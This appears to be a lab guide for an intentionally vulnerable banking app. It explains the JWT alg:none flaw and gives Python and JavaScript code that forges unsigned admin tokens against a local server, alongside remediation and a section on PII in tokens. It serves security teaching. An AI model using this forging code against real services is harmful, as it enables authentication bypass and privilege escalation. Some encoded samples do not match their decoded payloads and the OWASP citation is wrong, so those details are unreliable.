# JWT Vulnerability Explanation & How to Exploit

## What is JWT?

JWT (JSON Web Token) is a standard way to represent claims between two parties. It has three parts:

```
eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9  .  eyJzdWIiOiAiQlMxMDAwMDEiLCAicm9sZSI6ICJ1c2VyIn0  .  TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
         ↑                                           ↑                                               ↑
      HEADER (base64url)                      PAYLOAD (base64url)                            SIGNATURE (base64url)
```

---

## Breaking Down Each Part

### 1. HEADER

**Encoded**: `eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9`

**Decoded** (base64url decode):
```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

**What It Means**:
- `typ`: Token type is JWT
- `alg`: Algorithm used to sign the token
  - `HS256` = HMAC with SHA-256 (SECURE)
  - `none` = No signing (VULNERABLE)

### 2. PAYLOAD (Claims)

**Encoded**: `eyJzdWIiOiAiQlMxMDAwMDEiLCAicm9sZSI6ICJ1c2VyIn0`

**Decoded** (base64url decode):
```json
{
  "sub": "BS100001",
  "role": "user",
  "iat": 1691234567,
  "exp": 1691238167,
  "pan": "1234-5678-9012-3456",
  "aadhaar": "XXXX-XXXX-1234",
  "balance": 250000.50
}
```

**Standard Claims**:
- `sub` (subject) = User identifier (customer_id)
- `role` = User role (user/admin)
- `iat` (issued at) = Creation timestamp
- `exp` (expiration) = Expiration timestamp

**Vulnerable Claims** (should NOT be in JWT):
- `pan` = Payment card number (PRIVATE!)
- `aadhaar` = ID number (PRIVATE!)
- `balance` = Account balance (PRIVATE!)

### 3. SIGNATURE

**For HS256** (SECURE):
```
HMAC-SHA256(
  base64url(header) + "." + base64url(payload),
  secret_key
)
```

**For alg:none** (VULNERABLE):
```
empty_string  <- NO SIGNATURE CALCULATION
```

---

## The Vulnerability: alg:none

### What Happens

**Vulnerable Verification Code**:
```php
if ($this->engine->isVulnerable('auth', 'l12')) {
    if ($alg === 'none') {
        return $claims;  // Accept without checking signature!
    }
}
```

### Attack: How to Forge a JWT

**Step 1: Create Header with alg:none**
```json
{"typ": "JWT", "alg": "none"}
```

**Step 2: Create Payload with Claims You Want**
```json
{
  "sub": "BS100234",    // Impersonate this user
  "role": "admin",      // Claim admin role
  "iat": 1691234567,
  "exp": 9999999999     // Never expires
}
```

**Step 3: Encode Both as base64url**
```
header_encoded = "eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0"
payload_encoded = "eyJzdWIiOiAiQlMxMDAyMzQiLCAicm9sZSI6ICJhZG1pbiJ9"
```

**Step 4: Sign with Empty String (alg:none)**
```
signature = ""  <- Empty! No calculation needed
```

**Step 5: Combine with Dots**
```
forged_token = header_encoded + "." + payload_encoded + "."
             = "eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0.eyJzdWIiOiAiQlMxMDAyMzQiLCAicm9sZSI6ICJhZG1pbiJ9."
```

**Step 6: Use the Token**
```
GET /dashboard?access_token=<forged_token>
```

### Result
✅ Server accepts the token  
✅ User is authenticated as BS100234  
✅ User role is set to "admin"  
✅ No password required!

---

## Code to Forge JWT

### Python
```python
import json
import base64
import time

def forge_jwt_alg_none(customer_id, role='user'):
    # Step 1: Create header
    header = {
        "typ": "JWT",
        "alg": "none"
    }
    
    # Step 2: Create payload
    payload = {
        "sub": customer_id,
        "role": role,
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }
    
    # Step 3: Encode as base64url
    def b64url_encode(data):
        """Encode as base64url (no padding)"""
        json_str = json.dumps(data)
        b64 = base64.urlsafe_b64encode(json_str.encode())
        return b64.rstrip(b'=').decode('utf-8')
    
    header_encoded = b64url_encode(header)
    payload_encoded = b64url_encode(payload)
    
    # Step 4: Combine with empty signature
    forged_token = f"{header_encoded}.{payload_encoded}."
    
    return forged_token

# Usage
token = forge_jwt_alg_none("BS100234", role="user")
print(f"Token: {token}")

# Use in URL
url = f"http://localhost:9443/dashboard?access_token={token}"
print(f"URL: {url}")
```

### JavaScript (Browser Console)
```javascript
function forgeJWT(customerId, role = 'user') {
  const header = btoa(JSON.stringify({
    typ: "JWT",
    alg: "none"
  })).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  
  const payload = btoa(JSON.stringify({
    sub: customerId,
    role: role,
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600
  })).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  
  return `${header}.${payload}.`;
}

// Create forged token
const token = forgeJWT("BS100234", "admin");
console.log("Forged token:", token);

// Use it
window.location.href = `http://localhost:9443/dashboard?access_token=${token}`;
```

---

## The Second Vulnerability: PII in JWT

### Problem

JWT tokens are **NOT ENCRYPTED**, only signed/encoded. Anyone can:
1. Read the payload by base64-decoding it
2. See all claims (PAN, Aadhaar, balance)
3. Store it in logs/analytics
4. Accidental exposure in error messages

### Example Vulnerable Token

**Encoded**:
```
eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0.eyJzdWIiOiAiQlMxMDAwMDEiLCAicm9sZSI6ICJ1c2VyIiwgInBhbiI6ICIxMjM0LTU2NzgtOTAxMi0zNDU2IiwgImFhZGhhYXIiOiAiWFhYWC1YWFhYLTEyMzQiLCAiYmFsYW5jZSI6IDI1MDAwMC41MH0.
```

**Decoded Payload**:
```json
{
  "sub": "BS100001",
  "role": "user",
  "pan": "1234-5678-9012-3456",      <- SENSITIVE!
  "aadhaar": "XXXX-XXXX-1234",       <- SENSITIVE!
  "balance": 250000.50               <- SENSITIVE!
}
```

### Risks
- 🔓 Browser localStorage stores token
- 📝 Application logs may capture token
- 🌐 CDN/proxy logs may have token
- 📱 Mobile apps may backup token
- 🔌 Error messages may include token

### Solution
Only include **minimal claims**:
```json
{
  "sub": "BS100001",
  "role": "user",
  "iat": 1691234567,
  "exp": 1691238167
}
```

---

## Comparison: Vulnerable vs Secure

### VULNERABLE (Level 0)

**Header**:
```json
{"alg": "none"}  <- No signing!
```

**Payload**:
```json
{
  "sub": "BS100001",
  "role": "user",
  "pan": "1234-5678-9012-3456",      <- PII exposed
  "aadhaar": "XXXX-XXXX-1234",       <- PII exposed
  "balance": 250000.50                <- PII exposed
}
```

**Signature**: `` (empty, no verification)

**Security**: ❌ NONE

---

### SECURE (Level 3)

**Header**:
```json
{"alg": "HS256"}  <- Signed with HMAC-SHA256
```

**Payload**:
```json
{
  "sub": "BS100001",
  "role": "user",
  "iat": 1691234567,
  "exp": 1691238167
}
```

**Signature**: `HMAC-SHA256(header.payload, secret_key)`

**Security**: ✅ PROTECTED

---

## How Server Verification Works

### Vulnerable (Level 0)
```php
$header = decode($parts[0]);
if ($header['alg'] === 'none') {
    return $claims;  // ACCEPT WITHOUT CHECKING!
}
```

### Secure (Level 3)
```php
$header = decode($parts[0]);
if ($header['alg'] !== 'hs256') {
    return null;  // REJECT
}
$expected_sig = HMAC-SHA256($parts[0].'.'.$parts[1], $secret);
if ($parts[2] !== $expected_sig) {
    return null;  // REJECT
}
return $claims;  // Only accept valid signatures
```

---

## Real-World Attack Timeline

### Vulnerable System (Level 0)

```
Time 0:00 - Attacker opens browser
Time 0:01 - Attacker writes forging script
Time 0:02 - Attacker creates forged admin token
Time 0:03 - Attacker accesses admin dashboard
Time 0:04 - Attacker changes vulnerability levels to "secure"
Time 0:05 - Attacker logs out (covered tracks)
Time 2:00 - Admin notices levels changed, investigation starts
```

### Total Exploitation Time: 5 SECONDS

### Secure System (Level 3)

```
Time 0:00 - Attacker creates forged token
Time 0:01 - Attacker sends forged token
Time 0:02 - Server checks signature
Time 0:03 - Server rejects (invalid signature)
Time 0:04 - Attacker blocked from system
```

**Result**: Forged token REJECTED ❌

---

## Testing Yourself

### Test 1: Decode a Real JWT

Visit: https://jwt.io

Paste a real JWT from BankSploit and see:
- What's in the header
- What claims are exposed
- Whether the signature is valid

### Test 2: Forge a Token

```bash
python test_jwt_fixed.py
```

Watch for:
- `[VULN] Forged JWT (alg:none) ACCEPTED!`
- `[VULN] SQLi login attempt proceeded`

### Test 3: Verify Fix Works

1. Change auth.l12 to 3 in admin config
2. Restart app
3. Run test again
4. Should see: `[SECURE] Forged JWT rejected`

---

## Key Takeaways

### Vulnerability: alg:none
- ❌ Server accepts unsigned tokens
- ❌ Attacker can forge any token
- ❌ No signature verification
- ✅ Fix: Require HS256 signing

### Vulnerability: PII in JWT
- ❌ Sensitive data visible in base64
- ❌ Token stored in logs/localStorage
- ❌ Privacy violation
- ✅ Fix: Only include (sub, role, exp, iat)

### Impact
- 🔴 CRITICAL - Authentication bypass
- 🔴 CRITICAL - Privilege escalation
- 🟠 HIGH - Information disclosure
- 🟠 HIGH - Privacy violation

### Remediation
```
Set these to Level 3:
- auth.l12 = 3  (Require HS256 signature)
- auth.l17 = 3  (Remove PII from JWT)
- Restart app
```

---

## References

- **JWT Spec**: RFC 7519
- **JWA Spec**: RFC 7518 (Section 3.6 on alg:none)
- **CWE-347**: Improper Verification of Cryptographic Signature
- **OWASP**: A04:2021 Insecure Deserialization

---

## Further Reading

1. **Vulnerable Code**: `src/core/Auth.php` (verifyJWT function)
2. **Secure Code**: Same file, Level 3 branch
3. **Token Generation**: `src/modules/auth/api.php`
4. **Config File**: `vuln_config.json`

**Understanding the code is the best way to learn!**
